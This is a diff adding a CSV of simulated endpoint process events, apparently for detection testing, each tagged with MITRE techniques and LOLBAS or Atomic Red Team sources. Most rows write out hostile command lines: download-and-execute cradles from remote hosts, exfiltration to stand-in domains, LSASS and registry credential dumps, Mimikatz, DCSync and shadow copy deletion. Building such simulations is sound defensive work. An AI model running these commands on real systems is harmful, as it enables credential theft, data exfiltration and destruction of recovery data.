@@ -1,0 +1,614 @@
+id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
+PROC-TE-01,Threat Event,TRUE,WKS01,Shadow copy deletion with vssadmin.exe,C:\Windows\system32\cmd.exe,C:\Windows\system32\vssadmin.exe,vssadmin.exe,vssadmin.exe delete shadows /for=C,"Impact
+Execution","Inhibit System Recovery
+Command and Scripting Interpreter: Windows Command Shell",,
+PROC-TE-02,Threat Event,TRUE,WKS02,Whoami being used for local groups recon,C:\Windows\system32\cmd.exe,C:\Windows\system32\whoami.exe,whoami.exe,whoami /groups,"Discovery
+Execution","System Owner/User Discovery
+Command and Scripting Interpreter: Windows Command Shell",,
+PROC-TE-03,Threat Event,TRUE,WKS03,Process enumeration/discovery with tasklist,C:\Windows\system32\cmd.exe,C:\Windows\system32\tasklist.exe,tasklist.exe,tasklist,"Discovery
+Execution","Process Discovery
+Command and Scripting Interpreter: Windows Command Shell",,
+PROC-TE-04,Threat Event,TRUE,SRV04,Apache2 webserver process spawning whoami (recon commands via webshell),/usr/sbin/apache2,/usr/bin/whoami,whoami,/usr/bin/whoami,"Persistence
+Initial Access
+Execution","Server Software Component: Web Shell
+Exploit Public-Facing Application
+Exploitation for Client Execution",,
+PROC-TE-05,Threat Event,TRUE,UBUNTU05,Wget being used to download a shell script from a remote IP,/bin/bash,/usr/bin/wget,wget,wget http://193.176.183.245/a.sh,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Unix Shell",,
+PROC-TE-06,Threat Event,TRUE,UBUNTU06,Reading /etc/passwd with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/passwd,"Credential Access
+Execution","OS Credential Dumping
+Command and Scripting Interpreter: Unix Shell",,
+PROC-TE-07,Threat Event,TRUE,UBUNTU07,Reading /etc/shadow with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/shadow,"Credential Access
+Execution","OS Credential Dumping
+Command and Scripting Interpreter: Unix Shell",,
+PROC-TE-08,Threat Event,TRUE,UBUNTU08,Unix/Linux in-memory curl cradle (fileless execution),/usr/bin/dash,/usr/bin/curl,curl,curl http://193.176.183.245/ahdytg | sh,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Unix Shell",,
+PROC-TE-09,Threat Event,TRUE,WKS09,Tool Ingress via Appinstaller.exe (Lolbas Project),C:\Windows\system32\explorer.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe,AppInstaller.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLx,Command and Control,Ingress Tool Transfer,https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/,
+PROC-TE-10,Threat Event,TRUE,WKS10,Exfiltration via Windows Bash.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bash.exe,bash.exe,C:\Windows\System32\bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/193.176.183.245',"Exfiltration
+Execution","Exfiltration Over C2 Channel
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Bash/,
+PROC-TE-11,Threat Event,TRUE,WKS11,Tool Ingress via Bitsadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,"Command and Control
+Execution
+Defense Evasion
+Persistence","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell
+BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
+PROC-TE-12,Threat Event,TRUE,WKS12,Bitsadmin.exe being used to execute payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"Defense Evasion
+Execution
+Persistence","Hide Artifacts: NTFS File Attributes
+Command and Scripting Interpreter: Windows Command Shell
+BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
+PROC-TE-13,Threat Event,TRUE,WKS13,Bitsadmin.exe being used to copy cmd.exe to alternate location/name (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"Defense Evasion
+Execution
+Persistence","Masquerading: Rename System Utilities
+Command and Scripting Interpreter: Windows Command Shell
+BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
+PROC-TE-14,Threat Event,TRUE,WKS14,Certoc.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\certoc.exe,certoc.exe,C:\windows\system32\certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certoc/,
+PROC-TE-15,Threat Event,TRUE,WKS15,CertReq.exe being used for Exfiltration (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certreq.exe,certreq.exe,C:\Windows\System32\certreq.exe -Post -config https://hy7dy.xyz/ c:\windows\win.ini,"Exfiltration
+Execution","Exfiltration Over C2 Channel
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certreq/,
+PROC-TE-16,Threat Event,TRUE,WKS16,Certutil.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,C:\Windows\System32\certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certutil/,
+PROC-TE-17,Threat Event,TRUE,WKS17,Cmd.exe executing payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe - < fakefile.doc:payload.bat,Execution,Command and Scripting Interpreter: Windows Command Shell,https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
+PROC-TE-18,Threat Event,TRUE,WKS18,Cmd.exe exfiltration via WebDAV server (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe /C ""type C:\Public\creds.txt > \\\\193.176.183.245\pyr\creds.txt""","Exfiltration
+Execution","Exfiltration Over C2 Channel
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
+PROC-TE-19,Threat Event,TRUE,WKS19,Exfiltration via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://ui78d.xyz/fiosiu?encodedfile,"Exfiltration
+Execution","Exfiltration Over C2 Channel
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
+PROC-TE-20,Threat Event,TRUE,WKS20,Tool Ingress via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe https://ui78d.xyz/fiosiu,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
+PROC-TE-21,Threat Event,TRUE,WKS21,Tool Ingress via hh.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\SysWOW64\hh.exe,hh.exe,C:\Windows\SysWOW64\hh.exe https://ui78d.xyz/fiosiu,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Hh/,
+PROC-TE-22,Threat Event,TRUE,WKS22,Tool Ingress via ieexec.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe,ieexec.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe https://ui78d.xyz/fiosiu,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ieexec/,
+PROC-TE-23,Threat Event,TRUE,WKS23,Tool Ingress via MpCmdRun.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe,MpCmdRun.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe -DownloadFile -url https://ui78d.xyz/fiosiu -path c:\temp\beacon.exe,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/,
+PROC-TE-24,Threat Event,TRUE,WKS24,Arbitrary Code Execution via MSDT.exe (CVE-2022-30190 - Lolbas Project),C:\Program Files\Programs\Office 2019\Office14\excel.exe,C:\Windows\System32\Msdt.exe,Msdt.exe,"C:\Windows\System32\Msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","Defense Evasion
+Execution","System Binary Proxy Execution
+Exploitation for Client Execution",https://lolbas-project.github.io/lolbas/Binaries/Msdt/,
+PROC-TE-25,Threat Event,TRUE,WKS25,Tool Ingress via msedge.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Microsoft\Edge\Application\msedge.exe,msedge.exe,"C:\Program Files\Microsoft\Edge\Application\msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""http://example.com/evil.b64.html"" > out.b64","Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Msedge/,
+PROC-TE-26,Threat Event,TRUE,WKS26,Mshta VBS Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe vbscript:Close(Execute(""GetObject(""""script:https://ui78d.xyz/ac.sct"""")""))","Defense Evasion
+Execution
+Command and Control","System Binary Proxy Execution: Mshta
+Command and Scripting Interpreter: Windows Command Shell
+Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
+PROC-TE-27,Threat Event,TRUE,WKS27,Mshta JavaScript Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe javascript:a=GetObject(""script:https://ui78d.xyz/al.sct"").Exec();close();","Defense Evasion
+Execution
+Command and Control","System Binary Proxy Execution: Mshta
+Command and Scripting Interpreter: Windows Command Shell
+Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
+PROC-TE-28,Threat Event,TRUE,WKS28,Mshta Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,C:\Windows\System32\mshta.exe https://ui78d.xyz/fiosiu,"Defense Evasion
+Execution
+Command and Control","System Binary Proxy Execution: Mshta
+Command and Scripting Interpreter: Windows Command Shell
+Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
+PROC-TE-29,Threat Event,TRUE,WKS29,Msiexec download cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\msiexec.exe,msiexec.exe,C:\Windows\System32\msiexec.exe /q /i http://ui78d.xyz/tmp/cmd.png,"Defense Evasion
+Execution
+Command and Control","System Binary Proxy Execution: Msiexec
+Command and Scripting Interpreter: Windows Command Shell
+Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,
+PROC-TE-30,Threat Event,TRUE,WKS30,Ngen.exe Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe,ngen.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe http://ui78d.xyz/tmp/cmd.png,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ngen/,
+PROC-TE-31,Threat Event,TRUE,WKS31,LSASS Dumping via rdrleakdiag.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\rdrleakdiag.exe,rdrleakdiag.exe,C:\windows\system32\rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1,"Credential Access
+Execution","OS Credential Dumping: LSASS Memory
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/,
+PROC-TE-32,Threat Event,TRUE,WKS32,Credential Dumping via reg save (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\reg.exe,reg.exe,C:\windows\system32\reg.exe save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Reg/,
+PROC-TE-33,Threat Event,TRUE,WKS33,Tool Ingress via regsvr32.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\regsvr32.exe,regsvr32.exe,C:\Windows\System32\regsvr32.exe /s /n /u /i:http://ui78d.xyz/tmp/cmd.sct scrobj.dll,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/,
+PROC-TE-34,Threat Event,TRUE,WKS34,Tool Ingress via replace.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\replace.exe,replace.exe,C:\Windows\System32\replace.exe \\\\webdav.host.xyz\foo\bar.exe c:\Public\ /A,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Replace/,
+PROC-TE-35,Threat Event,TRUE,WKS35,NTLM hash leak via rpcping (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rpcping.exe,rpcping.exe,C:\Windows\System32\rpcping.exe -s 193.176.183.245 -e 1234 -a privacy -u NTLM,"Credential Access
+Execution","Forced Authentication
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rpcping/,
+PROC-TE-36,Threat Event,TRUE,WKS36,Rundll32 cradle via UNC path (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe \\\\193.176.183.245\share\payload.dll,EntryPoint","Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rundll32/,
+PROC-TE-37,Threat Event,TRUE,WKS37,NTDS.dit theft via Wbadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\wbadmin.exe,wbadmin.exe,"C:\Windows\System32\wbadmin start backup -backupTarget:C:\temp\ -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet","Credential Access
+Execution","OS Credential Dumping: NTDS
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/,
+PROC-TE-38,Threat Event,TRUE,WKS38,Tool Ingress via msedge_proxy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe,msedge_proxy.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe http://193.176.183.245/a.sh,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/,
+PROC-TE-39,Threat Event,TRUE,WKS39,Dump LSASS.exe Memory using renamed ProcDump (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,C:\Users\joebob\Documents\onedrive.exe -accepteula -ma lsass.exe C:\Windows\Temp\lssd.dmp,"Credential Access
+Execution","OS Credential Dumping: LSASS Memory
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/OtherMSBinaries/Procdump/,
+PROC-TE-40,Threat Event,TRUE,WKS40,Dump LSASS.exe Memory using comsvcs.dll (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full","Credential Access
+Execution","OS Credential Dumping: LSASS Memory
+Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Libraries/comsvcs/,
+PROC-TE-41,Threat Event,TRUE,WKS41,Dump LSASS.exe Memory using Out-Minidump.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory C:\Users\joebob\ART\ExternalPayloads\ -ErrorAction Ignore -Force | Out-Null try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop} catch{ $_; exit $_.Exception.Response.StatusCode.Value__} get-process lsass | Out-Minidump,"Credential Access
+Execution","OS Credential Dumping: LSASS Memory
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
+PROC-TE-42,Threat Event,TRUE,WKS42,Offline Credential Theft With Mimikatz (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,"C:\Users\joebob\Documents\onedrive.exe ""sekurlsa::minidump %tmp%\lss.DMP"" ""sekurlsa::logonpasswords full"" exit","Credential Access
+Execution","OS Credential Dumping: LSASS Memory
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
+PROC-TE-43,Threat Event,TRUE,WKS43,Powershell Mimikatz Cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds,"Credential Access
+Execution","OS Credential Dumping: LSASS Memory
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
+PROC-TE-44,Threat Event,TRUE,WKS44,Registry dumping via reg.exe (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\sam %temp%\sam,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-45,Threat Event,TRUE,WKS45,Registry dumping via reg.exe (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\system %temp%\system,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-46,Threat Event,TRUE,WKS46,Registry dumping via reg.exe (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\security %temp%\security,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-47,Threat Event,TRUE,WKS47,esentutl.exe SAM copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\esentutl.exe,esentutl.exe,C:\Windows\System32\esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-48,Threat Event,TRUE,WKS48,Dump volume shadow copy hives with certutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*","Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-49,Threat Event,TRUE,WKS49,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') samfile -consoleoutput -noninteractive,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-50,Threat Event,TRUE,WKS50,Dumping of SAM creds and secrets via Reg Export (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\sam %temp%\sam,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-51,Threat Event,TRUE,WKS51,Dumping of SAM creds and secrets via Reg Export (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\system %temp%\system,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-52,Threat Event,TRUE,WKS52,Dumping of SAM creds and secrets via Reg Export (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\security %temp%\security,"Credential Access
+Execution","OS Credential Dumping: Security Account Manager
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
+PROC-TE-53,Threat Event,TRUE,WKS53,Create Volume Shadow Copy with vssadmin (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C,"Credential Access
+Execution","OS Credential Dumping: NTDS
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
+PROC-TE-54,Threat Event,TRUE,WKS54,Dump Active Directory Database with NTDSUtil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\ntdsutil.exe,ntdsutil.exe,"C:\Windows\System32\ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\out"" q q","Credential Access
+Execution","OS Credential Dumping: NTDS
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
+PROC-TE-55,Threat Event,TRUE,WKS55,Create Volume Shadow Copy with WMI (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wmic.exe,wmic.exe,C:\Windows\System32\wmic.exe shadowcopy call create Volume=C:\,"Credential Access
+Execution","OS Credential Dumping: NTDS
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
+PROC-TE-56,Threat Event,TRUE,WKS56,Create Volume Shadow Copy with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')","Credential Access
+Execution","OS Credential Dumping: NTDS
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
+PROC-TE-57,Threat Event,TRUE,WKS57,Create Symlink to Volume Shadow Copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C:\ && mklink /D C:\Temp\vssstore \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1,"Credential Access
+Execution","OS Credential Dumping: NTDS
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
+PROC-TE-58,Threat Event,TRUE,WKS58,Create Volume Shadow Copy with diskshadow (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\diskshadow.exe,diskshadow.exe,C:\Windows\System32\diskshadow.exe /s C:\Windows\Temp\T1003.003\src\diskshadow.txt,"Credential Access
+Execution","OS Credential Dumping: NTDS
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
+PROC-TE-59,Threat Event,TRUE,WKS59,Dump Kerberos Tickets from LSA using dumper.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1'),"Credential Access
+Execution","OS Credential Dumping: LSA Secrets
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md,
+PROC-TE-60,Threat Event,TRUE,WKS60,DCSync - Active Directory (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\Public\onedrive.exe,onedrive.exe,"C:\Windows\Public\onedrive.exe ""lsadump::dcsync /domain:example.com /user:joebob@example.com"" ""exit""","Credential Access
+Execution","OS Credential Dumping: DCSync
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md,
+PROC-TE-61,Threat Event,TRUE,WKS61,Adfind Enumerate Active Directory Domain Controller Objects (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\Public\AdFind.exe,AdFind.exe,C:\Users\Public\AdFind.exe -sc dclist,"Discovery
+Execution","Remote System Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
+PROC-TE-62,Threat Event,TRUE,WKS62,Enumerate Active Directory Computers with Get-AdComputer (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Get-AdComputer -Filter *,"Discovery
+Execution","Remote System Discovery
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
